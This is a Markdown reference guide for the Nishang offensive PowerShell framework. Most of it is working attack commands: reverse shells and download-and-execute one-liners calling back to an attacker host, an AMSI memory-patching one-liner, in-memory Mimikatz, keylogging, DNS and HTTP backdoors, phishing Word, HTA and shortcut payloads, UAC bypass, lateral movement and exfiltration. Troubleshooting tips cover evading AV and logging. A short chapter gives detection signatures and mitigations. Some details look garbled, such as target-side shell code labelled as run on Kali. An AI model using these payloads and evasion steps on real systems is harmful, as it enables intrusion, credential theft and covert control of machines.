---
tool_name: "nishang"
display_name: "Nishang"
mitre_tactic: "execution"
mitre_tactic_id: "TA0002"
mitre_subcategory: "execution"
install_command: "sudo apt install nishang"
version: "0.7.6"
github_repo: "https://github.com/samratashok/nishang"
kali_tools_page: "https://www.kali.org/tools/nishang/"
difficulty_level: "intermediate-to-advanced"
requires_root: false
gui_available: false
tags: ["powershell", "post-exploitation", "red-team", "offensive", "windows"]
related_tools: ["powersploit", "metasploit-framework"]
---

# Nishang — Offensive PowerShell Framework

## Chapter 1: Introduction & Overview

### What is Nishang?

Nishang is a framework and collection of PowerShell scripts and payloads that enables usage of PowerShell for offensive security, penetration testing, and red teaming. It covers all phases of a penetration test — from reconnaissance and scanning to exploitation, post-exploitation, and exfiltration — using pure PowerShell without requiring disk writes on the target.

### History & Background

- **Created:** 2012 by Nikhil Mittal
- **Maintained:** Nikhil Mittal (Altered Security, formerly Pentester Academy)
- **License:** BSD 3-Clause
- **Language:** PowerShell (99.8%)
- **Current Version:** 0.7.6 (November 2017)
- **GitHub Stars:** 10k+

Nishang was built during real penetration tests to fill gaps that Metasploit's PowerShell modules and PowerSploit left open. It provides 60+ scripts organized into functional categories: ActiveDirectory, Backdoors, Bypass, Client, Escalation, Execution, Gather, MITM, Pivot, Scan, Shells, and Utility.

### When to Use This Tool

- **Windows post-exploitation:** Execute payloads on compromised Windows hosts
- **Fileless attacks:** Run scripts entirely in memory without writing to disk
- **Privilege escalation:** Bypass UAC and escalate to SYSTEM
- **Credential harvesting:** Dump hashes, extract WLAN keys, harvest passwords
- **Persistence:** Deploy backdoors via registry, WMI, scheduled tasks
- **AV evasion:** Bypass AMSI and other defenses
- **Red team operations:** Deploy decoy documents, reverse shells, C2 channels

### When NOT to Use This Tool

- Without written authorization from the target system owner
- On production systems during business hours without coordination
- Against systems outside the defined scope of engagement
- When PowerShell is blocked by execution policies and bypass is outside scope

### Legal and Ethical Considerations

- **Written authorization** is mandatory before any offensive PowerShell usage
- **Scope limitations** — Nishang scripts can cause significant damage; define boundaries
- **Logging** — PowerShell transcript logging and script block logging may capture activities
- **AV/EDR alerts** — Nishang triggers most AV solutions; coordinate with blue team during authorized tests
- **Cleanup** — Remove all deployed backdoors, persistence mechanisms, and scripts after testing

### Key Concepts

- **Fileless Execution:** Running PowerShell entirely in memory, leaving no artifacts on disk
- **AMSI Bypass:** Anti-Malware Scan Interface evasion techniques
- **PowerShell Remoting (WinRM):** Remote command execution via WS-Man protocol
- **Encoded Commands:** Base64-encoded payloads that bypass basic command-line logging
- **In-Memory Download and Execute:** Fetching scripts from a web server and executing via `Invoke-Expression` (IEX)
- **Reflection:** Loading .NET assemblies directly in memory without writing files
- **DCShadow:** Active Directory persistence technique that registers a rogue DC
- **Powerpreter:** Single-script module containing all Nishang functionality

---

## Chapter 2: Installation & Setup

### System Requirements

- **Attacker:** Kali Linux (for serving payloads and receiving shells)
- **Target:** Windows 7+ with PowerShell v3+ installed
- **Network:** Attacker must be reachable from the target (for reverse shells)
- **Disk Space:** 6.41 MB installed
- **Dependencies:** kali-defaults

### Installation Methods

#### Method 1: APT (Recommended on Kali)
```bash
sudo apt update
sudo apt install nishang
```

#### Method 2: From GitHub
```bash
git clone https://github.com/samratashok/nishang.git
cd nishang
```

#### Method 3: Manual Copy to Target
```powershell
# On attacker (Linux), serve files via HTTP
cd /usr/share/nishang
python3 -m http.server 8080

# On target (Windows), download specific script
powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.100:8080/Shells/Invoke-PowerShellTcp.ps1' -OutFile 'C:\Temp\shell.ps1'"
```

### Configuration

**Kali Install Location:**
```
/usr/share/nishang/
├── ActiveDirectory/
├── Antak-WebShell/
├── Backdoors/
├── Bypass/
├── Client/
├── Escalation/
├── Execution/
├── Gather/
├── MITM/
├── Misc/
├── Pivot/
├── Prasadhak/
├── Scan/
├── Shells/
├── Utility/
├── nishang.psm1
└── powerpreter/
```

### Verification
```powershell
# Verify module loads correctly
Import-Module .\nishang.psm1
Get-Command -Module nishang
```

---

## Chapter 3: Basic Usage

### Loading Nishang

#### Load All Scripts (Module Import)
```powershell
PS C:\nishang> Import-Module .\nishang.psm1
```
**Explanation:** Loads all Nishang functions into the current PowerShell session. Requires PowerShell v3+.

#### Load Individual Scripts (Dot Sourcing)
```powershell
PS C:\nishang> . C:\nishang\Gather\Get-Information.ps1
PS C:\nishang> Get-Information
```
**Explanation:** Dot-sourcing loads a single script's exported function. More targeted than loading everything.

#### Get Help for Any Function
```powershell
PS C:\nishang> Get-Help Invoke-PowerShellTcp -Full
```
**Explanation:** Displays complete help including examples, parameters, and descriptions for any Nishang function.

### Reverse Shell — First Connection

#### Step 1: Start Listener on Kali
```bash
nc -lvnp 4444
```
**Explanation:** Opens a Netcat listener on port 4444 to receive the incoming reverse shell connection.

#### Step 2: Execute on Target
```powershell
PS C:\nishang> . .\Shells\Invoke-PowerShellTcp.ps1
PS C:\nishang> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444
```
**Explanation:** Executes the PowerShell reverse TCP shell back to the attacker's listener.

#### Step 3: Establish Interactive Session
```powershell
# On Kali, once shell connects:
PS C:\Users\target> $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
PS C:\Users\target> $stream = $client.GetStream()
PS C:\Users\target> [byte[]]$bytes = 0..65535 | %{ 0 }
```
**Explanation:** The reverse shell provides a PowerShell prompt on the target system routed through the Netcat listener.

### In-Memory Download and Execute

#### One-Liner Payload
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444
```
**Explanation:** Downloads the script from the attacker's web server and executes it entirely in memory without touching disk.

#### Encoded Command Execution
```bash
# On Kali, encode the script
cd /usr/share/nishang/Utility
powershell -c ". .\Invoke-Encode.ps1; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand"
```
**Explanation:** Encodes the script into Base64, which can be passed to `powershell -e` to bypass basic logging.

```powershell
# On target
powershell -e [encoded_command_here]
```
**Explanation:** Executes the encoded command, evading command-line argument logging.

### Gathering Information

#### System Reconnaissance
```powershell
PS C:\nishang> . .\Gather\Get-Information.ps1
PS C:\nishang> Get-Information
```
**Explanation:** Collects comprehensive system information including OS details, processes, installed software, network configuration, and shares.

#### Check for Virtual Machine
```powershell
PS C:\nishang> . .\Gather\Check-VM.ps1
PS C:\nishang> Check-VM
```
**Explanation:** Detects if the target is running inside a virtual machine (VMware, VirtualBox, Hyper-V, etc.). Useful for evasion awareness.

#### Extract Password Hashes
```powershell
PS C:\nishang> . .\Gather\Get-PassHashes.ps1
PS C:\nishang> Get-PassHashes
```
**Explanation:** Extracts NTLM password hashes from the SAM database. Requires SYSTEM privileges.

#### WLAN Key Extraction
```powershell
PS C:\nishang> . .\Gather\Get-WLAN-Keys.ps1
PS C:\nishang> Get-WLAN-Keys
```
**Explanation:** Retrieves saved WiFi passwords in plaintext from the target system.

---

## Chapter 4: Intermediate Usage

### Reverse Shells — Multiple Transport Protocols

#### TCP Reverse Shell
```powershell
PS C:\nishang> . .\Shells\Invoke-PowerShellTcp.ps1
PS C:\nishang> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444
```
**Explanation:** Standard TCP reverse shell. Reliable but easily detected by network monitoring.

#### UDP Reverse Shell
```powershell
PS C:\nishang> . .\Shells\Invoke-PowerShellUdp.ps1
PS C:\nishang> Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.100 -Port 4444
```
**Explanation:** Reverse shell over UDP. Less reliable due to connectionless nature, but can evade TCP-based detection.

#### HTTP/HTTPS Reverse Shell
```powershell
# On Kali, start the HTTP server
cd /usr/share/nishang/Shells
python3 -m http.server 8080

# On target
PS C:\nishang> . .\Shells\Invoke-PoshRatHttps.ps1
PS C:\nishang> Invoke-PoshRatHttps -IPAddress 192.168.1.100 -Port 8443
```
**Explanation:** Reverse shell over HTTPS. Encrypts traffic and blends with legitimate HTTPS traffic.

#### ICMP Reverse Shell
```powershell
PS C:\nishang> . .\Shells\Invoke-PowerShellIcmp.ps1
PS C:\nishang> Invoke-PowerShellIcmp -IPAddress 192.168.1.100
```
**Explanation:** Encodes shell traffic in ICMP echo requests/replies. Useful when only ICMP is allowed outbound.

#### WMI-Based Shell
```powershell
PS C:\nishang> . .\Shells\Invoke-PowerShellWmi.ps1
PS C:\nishang> Invoke-PowerShellWmi -ComputerName 192.168.1.200 -Credential $cred
```
**Explanation:** Executes commands via WMI on a remote host. Requires valid credentials with admin access.

### Credential Harvesting

#### Mimikatz In-Memory
```powershell
PS C:\nishang> . .\Gather\Invoke-Mimikatz.ps1
PS C:\nishang> Invoke-Mimikatz
```
**Explanation:** Loads Mimikatz entirely in memory to dump credentials without writing the binary to disk. Requires SYSTEM privileges.

#### WDigest Downgrade Attack
```powershell
PS C:\nishang> . .\Gather\Invoke-MimikatzWDigestDowngrade.ps1
PS C:\nishang> Invoke-MimikatzWDigestDowngrade
```
**Explanation:** Downgrades Windows 8.1/Server 2012+ to store passwords in plaintext by enabling WDigest credential caching.

#### LSA Secret Extraction
```powershell
PS C:\nishang> . .\Gather\Get-LSASecret.ps1
PS C:\nishang> Get-LSASecret
```
**Explanation:** Extracts LSA secrets stored in the registry. Requires SYSTEM privileges.

#### Keylogger Deployment
```powershell
PS C:\nishang> . .\Gather\Keylogger.ps1
PS C:\nishang> Start-KeyLogger
```
**Explanation:** Starts a background keylogger that captures all keystrokes. Use `Parse_Keys` utility to decode logged keys.

### Persistence Mechanisms

#### HTTP Backdoor
```powershell
PS C:\nishang> . .\Backdoors\HTTP-Backdoor.ps1
PS C:\nishang> HTTP-Backdoor -IPAddress 192.168.1.100 -Port 8080 -URL http://192.168.1.100:8080/tasks
```
**Explanation:** Deploys a backdoor that periodically checks a remote URL for commands and executes them in memory.

#### DNS TXT Backdoor
```powershell
PS C:\nishang> . .\Backdoors\DNS_TXT_Pwnage.ps1
PS C:\nishang> DNS_TXT_Pwnage -IPAddress 192.168.1.100 -DomainName attacker.com
```
**Explanation:** Receives commands via DNS TXT record queries. Useful for covert C2 when DNS is not monitored.

#### Registry Backdoor
```powershell
PS C:\nishang> . .\Backdoors\Add-RegBackdoor.ps1
PS C:\nishang> Add-RegBackdoor -TriggerWord "utilman"
```
**Explanation:** Uses the Sticky Keys/Utilman debugger trick to execute a payload when specific key combinations are pressed at the login screen.

#### Screen Saver Backdoor
```powershell
PS C:\nishang> . .\Backdoors\Add-ScrnSaveBackdoor.ps1
PS C:\nishang> Add-ScrnSaveBackdoor -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```
**Explanation:** Configures the Windows screensaver to execute a PowerShell payload when activated.

### Decoy Document Generation

#### Infected Word Document
```powershell
PS C:\nishang> . .\Client\Out-Word.ps1
PS C:\nishang> Out-Word -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```
**Explanation:** Creates a Word document that executes the specified PowerShell payload when opened by the target user.

#### Infected HTA File
```powershell
PS C:\nishang> . .\Client\Out-HTA.ps1
PS C:\nishang> Out-HTA -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```
**Explanation:** Creates an HTA file for phishing campaigns. When the target opens the HTA, the payload executes.

#### Infected Shortcut File
```powershell
PS C:\nishang> . .\Client\Out-Shortcut.ps1
PS C:\nishang> Out-Shortcut -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```
**Explanation:** Creates a shortcut (.lnk) file that executes a PowerShell payload when clicked.

### Privilege Escalation

#### Bypass UAC
```powershell
PS C:\nishang> . .\Escalation\Invoke-PsUACme.ps1
PS C:\nishang> Invoke-PsUACme -Method fubuki -Command "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/priv.ps1')"
```
**Explanation:** Bypasses User Account Control using known UAC bypass methods (eventvwr, fubuki, etc.).

#### Enable Duplicate Token
```powershell
PS C:\nishang> . .\Escalation\Enable-DuplicateToken.ps1
PS C:\nishang> Enable-DuplicateToken
```
**Explanation:** Duplicates the SYSTEM token from a running SYSTEM process to elevate the current session.

---

## Chapter 5: Advanced Usage

### AMSI Bypass Techniques

#### Invoke-AmsiBypass
```powershell
PS C:\nishang> . .\Bypass\Invoke-AmsiBypass.ps1
PS C:\nishang> Invoke-AmsiBypass
```
**Explanation:** Implements publicly known AMSI bypass methods. Multiple techniques available — selects based on OS version.

#### Manual AMSI Patching
```powershell
# Patch AMSI in memory
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```
**Explanation:** Patches the AmsiScanBuffer function in memory to return clean (AMSI_RESULT_CLEAN). This is a one-liner for script block logging evasion.

### Antak WebShell

#### Deploy Antak
```powershell
# Copy Antak-WebShell to target web server
# Access via browser: http://target.example.com/antak.aspx
```
**Explanation:** Antak is an ASPX webshell that allows executing PowerShell scripts in memory, running commands, and uploading/downloading files through a web interface.

### PowerShell Remoting Exploitation

#### Create Multiple Sessions
```powershell
PS C:\nishang> . .\Pivot\Create-MultipleSessions.ps1
PS C:\nishang> Create-MultipleSessions -UserNames admin,backup -Password pass123 -ComputerNames 192.168.1.201,192.168.1.202,192.168.1.203
```
**Explanation:** Tests credentials against multiple hosts and creates persistent PSSessions for lateral movement.

#### Remote WMI Access
```powershell
PS C:\nishang> . .\Backdoors\Set-RemoteWMI.ps1
PS C:\nishang> Set-RemoteWMI -UserName lowpriv
```
**Explanation:** Modifies WMI namespace permissions to allow a non-admin user to execute commands remotely via WMI.

#### Remote PS Remoting
```powershell
PS C:\nishang> . .\Backdoors\Set-RemotePSRemoting.ps1
PS C:\nishang> Set-RemotePSRemoting -UserName lowpriv
```
**Explanation:** Configures PowerShell remoting permissions for a non-admin user, enabling lateral movement without elevated privileges.

### Port Scanning and Brute Force

#### Internal Port Scanner
```powershell
PS C:\nishang> . .\Scan\Port-Scan.ps1
PS C:\nishang> Port-Scan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254 -Ports 21,22,80,445,3389
```
**Explanation:** Scans an IP range for open ports. Useful for internal recon when nmap is not available on the target.

#### Brute Force
```powershell
PS C:\nishang> . .\Scan\Brute-Force.ps1
PS C:\nishang> Brute-Force -UserName admin -Passwords pass.txt -URL http://192.168.1.100/login
```
**Explanation:** Brute forces FTP, AD, MSSQL, or SharePoint credentials. Useful for password spraying in internal environments.

### Encoding and Obfuscation

#### Encode Payloads
```powershell
PS C:\nishang> . .\Utility\Invoke-Encode.ps1
PS C:\nishang> Invoke-Encode -DataToEncode C:\payload.ps1 -OutCommand
```
**Explanation:** Compresses and Base64-encodes a script for use with `powershell -e` parameter.

#### Decode Payloads
```powershell
PS C:\nishang> . .\Utility\Invoke-Decode.ps1
PS C:\nishang> Invoke-Decode -DecodingFileName C:\encoded.txt -OutCommandFileName C:\decoded.ps1
```
**Explanation:** Decodes Base64-encoded scripts produced by Invoke-Encode.

#### ROT13 Encoding
```powershell
PS C:\nishang> . .\Utility\ConvertTo-ROT13.ps1
PS C:\nishang> ConvertTo-ROT13 -String "SensitiveText"
```
**Explanation:** Applies ROT13 encoding to strings. Simple obfuscation for basic detection evasion.

### Data Exfiltration

#### Add Exfiltration Capability
```powershell
PS C:\nishang> . .\Utility\Add-Exfiltration.ps1
PS C:\nishang> Add-Exfiltration -ScriptToMutate C:\Gather\Get-Information.ps1 -ExfilOption DNS -DNSHostName attacker.com
```
**Explanation:** Wraps any Nishang script with exfiltration capabilities via Gmail, Pastebin, web server, or DNS.

#### SSID-Based Exfiltration
```powershell
PS C:\nishang> . .\Gather\Invoke-SSIDExfil.ps1
PS C:\nishang> Invoke-SSIDExfil -DataToExfil "domainadmin:password123" -SSIDName "MyWiFi"
```
**Explanation:** Exfiltrates data by broadcasting it as WiFi SSID names. Unusual exfiltration channel that may bypass DLP.

### Persistence Mechanisms

#### DCShadow (AD Persistence)
```powershell
PS C:\nishang> . .\ActiveDirectory\Set-DCShadowPermissions.ps1
PS C:\nishang> Set-DCShadowPermissions -ComputerName compromisedDC -DomainAdmin
```
**Explanation:** Modifies AD objects to provide minimal permissions required for DCShadow attack — registers a rogue domain controller to modify AD attributes.

#### Network Relay
```powershell
PS C:\nishang> . .\Pivot\Invoke-NetworkRelay.ps1
PS C:\nishang> Invoke-NetworkRelay -FromPort 3389 -ToHost 10.10.10.5 -ToPort 3389
```
**Explanation:** Creates network relays between compromised hosts for pivoting through the network.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Phishing Campaign with Decoy Document

**Objective:** Gain initial access via a phishing email with a malicious Word document.

**Steps:**
```bash
# On Kali, set up listener
nc -lvnp 4444

# Start web server for payload delivery
cd /usr/share/nishang/Shells && python3 -m http.server 8080
```

```powershell
# Generate infected Word document
PS C:\nishang> . .\Client\Out-Word.ps1
PS C:\nishang> Out-Word -Payload "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444" -Remove
```

**Results:** Target opens the Word document, payload executes, reverse shell connects back to the attacker.

### Scenario 2: Internal Network Pivoting

**Objective:** Move laterally from a compromised workstation to a domain controller.

**Steps:**
```powershell
# 1. Harvest credentials
PS C:\nishang> . .\Gather\Invoke-Mimikatz.ps1
PS C:\nishang> Invoke-Mimikatz

# 2. Test credentials against other hosts
PS C:\nishang> . .\Scan\Brute-Force.ps1
PS C:\nishang> Brute-Force -UserName administrator -Passwords pass.txt -URL http://192.168.1.1/login

# 3. Create sessions to multiple hosts
PS C:\nishang> . .\Pivot\Create-MultipleSessions.ps1
PS C:\nishang> Create-MultipleSessions -UserNames administrator -Password P@ssw0rd -ComputerNames 192.168.1.201,192.168.1.202

# 4. Execute commands on remote hosts
PS C:\nishang> . .\Pivot\Run-EXEonRemote.ps1
PS C:\nishang> Run-EXEonRemote -ComputerName 192.168.1.201 -UserName administrator -Password P@ssw0rd -File .\payload.exe
```

**Results:** Gained access to domain controller through credential reuse and lateral movement.

### Scenario 3: Persistent Access via DNS Backdoor

**Objective:** Establish long-term covert access using DNS as the C2 channel.

**Steps:**
```powershell
# 1. Deploy DNS TXT backdoor
PS C:\nishang> . .\Backdoors\DNS_TXT_Pwnage.ps1
PS C:\nishang> DNS_TXT_Pwnage -IPAddress 192.168.1.100 -DomainName c2.attacker.com

# 2. On attacker, set up DNS server
# Configure DNS TXT records for command delivery

# 3. Exfiltrate data via DNS
PS C:\nishang> . .\Utility\Add-Exfiltration.ps1
PS C:\nishang> Add-Exfiltration -ScriptToMutate C:\Gather\Get-Information.ps1 -ExfilOption DNS -DNSHostName attacker.com
```

**Results:** Covert C2 channel established using DNS TXT queries, evading most network monitoring.

### Scenario 4: Red Team Engagement

**Objective:** Complete red team assessment from initial access to domain compromise.

**Steps:**
```bash
# Phase 1: Initial Access (Kali)
# Send phishing email with Out-Word payload

# Phase 2: Establish Persistence
powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444

# Phase 3: Post-Exploitation (PowerShell on target)
# Gather credentials, hash dumps, WLAN keys
# Enumerate network, identify high-value targets
# Pivot to domain controllers
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect Nishang

- **AMSI Integration:** Windows 10+ AMSI scans PowerShell scripts before execution
- **Script Block Logging:** Records deobfuscated PowerShell code in Event Log (Event ID 4104)
- **Module Logging:** Logs individual PowerShell module operations (Event ID 4103)
- **Transcript Logging:** Full session logging when enabled via GPO
- **ETW (Event Tracing for Windows):** Real-time PowerShell execution monitoring
- **Constrained Language Mode:** Limits PowerShell to safe subset

### Known Signatures

```
# PowerShell AMSI detection patterns
AMSI Initialize failed
AMSI Scan Buffer

# Common Nishang function names in logs
Invoke-PowerShellTcp
Invoke-PowerShellUdp
Invoke-PoshRatHttps
Invoke-Mimikatz
Get-PassHashes
Get-Information

# Script block logging patterns
DownloadString
DownloadFile
Invoke-Expression
IEX
Net.WebClient
```

### Mitigation Strategies

- **Enable AMSI** on all Windows 10+ systems
- **Enable Script Block Logging** (GPO: Administrative Templates > Windows PowerShell)
- **Enable Module Logging** for PowerShell modules
- **Use Constrained Language Mode** for non-administrative users
- **Block PowerShell for standard users** via AppLocker or WDAC
- **Monitor outbound connections** from PowerShell processes
- **Enable PowerShell Remoting only where needed**

### Blue Team Response

- **Event ID 4104** (Script Block Logging) — Shows full PowerShell code executed
- **Event ID 4103** (Module Logging) — Shows module-level operations
- **Event ID 4688** (Process Creation) — Shows PowerShell command-line arguments
- **Network connections** — Unusual outbound connections from powershell.exe
- **Registry changes** — Persistence mechanism modifications

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "The term 'Invoke-PowerShellTcp' is not recognized"
**Cause:** Script not loaded into current session
**Solution:**
```powershell
. .\Shells\Invoke-PowerShellTcp.ps1
```

#### Error: "Access Denied" / "Permission Denied"
**Cause:** Insufficient privileges for the operation
**Solution:** Run as Administrator or SYSTEM. Use `Invoke-PsUACme` to bypass UAC if needed.

#### Error: "AMSI detected and blocked the script"
**Cause:** Windows AMSI identified the script as malicious
**Solution:** Use AMSI bypass techniques before loading Nishang scripts. Consider encoding payloads.

#### Error: "Connection refused" on reverse shell
**Cause:** Listener not running on attacker machine or network blocking connection
**Solution:** Verify Netcat listener is running: `nc -lvnp 4444`. Check firewall rules.

#### Error: "Execution of scripts is disabled on this system"
**Cause:** PowerShell execution policy is set to Restricted
**Solution:**
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

### Performance Optimization

- **Use individual scripts** instead of loading the entire module
- **Use encoded commands** to avoid command-line logging
- **Serve payloads over HTTPS** to avoid network inspection
- **Use DNS-based C2** when bandwidth is limited
- **Minimize round-trips** by combining operations in single scripts

### FAQ

**Q: Does Nishang work on PowerShell Core (7.x)?**
A: Most scripts target Windows PowerShell 5.1. Some scripts may not work on PowerShell Core due to .NET Framework dependencies.

**Q: How do I avoid AV detection?**
A: Use in-memory execution, AMSI bypass, encoded commands, and custom function names. No single technique is 100% effective.

**Q: Can I use Nishang for lateral movement?**
A: Yes. Use `Create-MultipleSessions` for credential testing and `Run-EXEonRemote` for remote execution. PowerShell Remoting is the primary lateral movement channel.

**Q: What's the difference between Nishang and PowerSploit?**
A: Nishang focuses on offensive PowerShell scripts for all pentest phases. PowerSploit focuses on specific post-exploitation techniques (code execution, persistence, exfiltration, recon). They complement each other.

**Q: Is Nishang still maintained?**
A: The last release (v0.7.6) was November 2017. The framework is mature but not actively developed. Scripts still work on modern Windows systems.

---

## Resources

### Official Documentation
- [GitHub Repository](https://github.com/samratashok/nishang)
- [Kali Tools Page](https://www.kali.org/tools/nishang/)
- [Nishang Wiki](https://github.com/samratashok/nishang/wiki)

### Tutorials
- [Nishang Overview by Nikhil Mittal](http://labofapenetrationtester.com/2014/06/nishang-0-3-4.html)
- [Introducing Nishang](http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html)
- [Powerpreter and Nishang Part 1](http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html)
- [AMSI Bypass Techniques](http://labofapenetrationtester.com/2016/09/amsi.html)

### Books
- "PowerShell for Pentesters" by Nikhil Mittal
- "Black Hat PowerShell" by Donato Campagna
- "PowerShell for Offensive Security" by Nikhil Mittal

### Related Tools
- **PowerSploit:** Post-exploitation PowerShell framework (complementary)
- **Empire:** PowerShell/C# post-exploitation framework with C2 capabilities
- **Cobalt Strike:** Commercial C2 with PowerShell payloads
- **Metasploit:** Multi-platform exploitation framework

### Practice Resources
- [VulnHub](https://www.vulnhub.com/) — Windows vulnerable VMs
- [Hack The Box](https://www.hackthebox.com/) — Windows-based challenges
- [TryHackMe](https://www.tryhackme.com/) — PowerShell-focused rooms
- [Altered Security Labs](https://www.alteredsecurity.com/) — PowerShell pentesting labs
